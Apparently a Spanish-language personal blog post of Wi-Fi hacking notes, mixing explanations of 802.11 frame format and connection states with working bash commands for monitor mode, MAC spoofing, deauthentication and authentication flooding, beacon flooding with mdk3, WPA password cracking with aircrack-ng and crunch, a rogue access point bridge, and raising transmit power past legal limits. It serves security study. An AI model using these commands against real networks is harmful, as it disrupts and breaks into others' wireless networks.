---
title: 'Wi-fi'
description: ''
pubDate: 'May 12 2023'
heroImage: 'https://res.cloudinary.com/djc1umong/image/upload/v1685504739/Screenshot_from_2023-05-30_23-45-31_akzecv.png'
slug: 'trip/wifi'
---

### Basic

La maxima transmision de poder esta basado en las leyes de cada pais llamado regulatory domain (regdomain) que corresponde al ISO del codigo del pais.

Por defecto el adaptador esta configurado a cero, pero se puede cambiar por la linea de comandos

#### 802.11 MPDU (MAC Protocol DATA Unit) formato

Cada campo esta anotado por la longitud de su byte

<div id="table">

| bytes 2          | 2           | 6       | 6     | 6       | 2                | 6     | 0-2312     | 4         |     |       |
| ---------------- | ----------- | ------- | ----- | ------- | ---------------- | ----- | ---------- | --------- | --- | ----- |
| frame control    | Duration ID | Addr1   | Addr2 | Addr3   | Sequence Control | Addr4 | Frame Body | fcs       |     |       |
| protocol version | type        | subtype | to DS | From DS | More flag        | Retry | Pwr Mgmt   | More Data | wep | order |
| bits 2           | 2           | 4       | 1     | 1       | 1                | 1     | 1          | 1         | 1   | 1     |

</div>

```bash

# Caffe-Latte Attack
lsmod
# basics #
iwconfig
#more information
iw list

# Pone el wifi en el canal 11
iwconfig wlan0 channel 11
iw dev wlan0 set channel 11

# dbm #
# incrementar el maximo poder de transmision en el adaptador wifi
iw reg set BO

# 30 dbm corresponde a 1000mW
iw dev wlan0 set txpower fixed 30dbm

# confirmar que funciona
iwconfig wlan0

# test mode (calidad de nuestro setup para el AP "access point") #
aireplay-ng -9 wlan0

```

<img src='https://res.cloudinary.com/djc1umong/image/upload/v1685504598/Screenshot_from_2023-05-30_23-42-53_qued87.png' />

```bash
## Set MONITOR MODE
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
## cambiar nuestro mac para camuflarse
#ifconfig eth0 hw ether 00:11:22:33:44:55

macchanger -h
sudo airmon-ng check
sudo airmon-ng check kill

ifconfig wlan0 down

iwconfig wlan0

ifconfig wlan0 up

# creamos la interfaz mon0 a partir de wlan0
iw dev wlan0 interface add mon0 type monitor

#########################################
sudo ip link set wlp1s0 down
#sudo iw wlp1s0 set monitor none
#;sudo iw wlp1s0 set type managed
;sudo iw wlp1s0 set type monitor
sudo ip link set wlp1s0 up
###########################

ifconfig mon0 up

# monitoreamos toda la red
airodump-ng wlan0

# Monitoreamos la red mac_address por el canal 36 usando la interface wlan0
airodump-ng --bssid mac_address -c 36 wlan0 -w captura.txt

# Enviamos paquetes de deactentication
aireplay-ng -0 15 -a mac_address -c device_address_station wlan0

# ataque deauth
aireplay-ng -0 1 -a mac_address_BSSID -c device_address_station-client_mac wlan0

# ataque de authenticacion para saturar la red
aireplay-ng -1 0 -a mac_address -h device_address_station_random wlan0

# Enviar usuaruois de one
mdk3 wlan0 a -a mac_address

## Ataque 3 de beacons meter usuarios a la red wifi
# usando wlan0 ataque b con el archivo redes.txt -a wpa2 cada segundo x el canal 11
# cat redes.txt
# network1
# network2
# network3

mdk3 wlan0 b -f redes.txt -a -s 1000 -c 11

# Brute force
aircrack-ng -w wordlist cap.file

# create diccionario, dictionary
# generate, generar, contraseñas
crunch 8 8 | aircrack-ng -e RosNetwork file.cap -w -

# crunch 8 8 -t passwo@% >> passwords

```

**BSSID:** Identifica un AP
**Dirección de destino (DA):** Destino final para recivir el frame
**Dirección fuente (SA):** Fuente original que creo el frame
**Dirección del destinatario (RA):** Destino STA
**Dirección del transmisor (TA):** Transmisor STA

Los _beacons_ son fotogramas que transmite periodicamente el AP. Su proposito es anunciar la red WI-FI, contiene información sobre los parametros de la red y capacidades del AP como tasas de rendimiento admitidas

_Probe requests_ son enviados por el cliente para determinar la disponibilidad de la red, contiene el nombre SSID y es enviado por todos los canales, un nullbyte puede ser enviado si no quiere buscar una red especifica

_Probe responses_ son enviados por el AP una vez que recibe el probe request, son parecidos al beacon pero con información adicional según lo especificado por el cliente que se comunica dentro del prove request correspondiente

Despues de la authenticación una estacion necesita ser asociada por el AP, este es el proposito del _Association Request_ frames, contiene información sobre las capacidades STA, velocidades de data transmitida y el SSID de la red a la que desea asociarse

### 3 estados posibles de conexión

- No autenticado
- Autenticado pero no asociado
- Autenticado y asociado

El estandar 802.11 original especifica que hay 2 modos de autenticación diferentes.

- Autenticación abierta
- Autenticación de llave compartida

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1691031056/Screenshot_from_2023-08-02_22-50-09_yi6gyw.webp" alt="airodump-ng">

esta seccion muestra información sobre los clientes de la red

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1691031181/Screenshot_from_2023-08-02_22-52-47_mzhdsw.webp" alt="">

- [DB para brute-force](https://www.renderlab.net/projects/WPA-tables/)

### Airbase-ng

```bash
# Deprecated
# brctl addbr br0
# brctl addif br0 eth0
# brctl addif br0 at0

ip link add br0 type bridge
ip link set dev eth0 master br0
ip link set dev at0 master br0

ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig br0 192.168.0.10 up

iptables -t nat -A POSTROUTING -o br0 -j MASQUERADE

echo 1 > /proc/sys/net/ipv4/ip_forward

# Disponible para conectarse a internet en este punto

ip link set veth0 up
ip link set veth0-br up
```
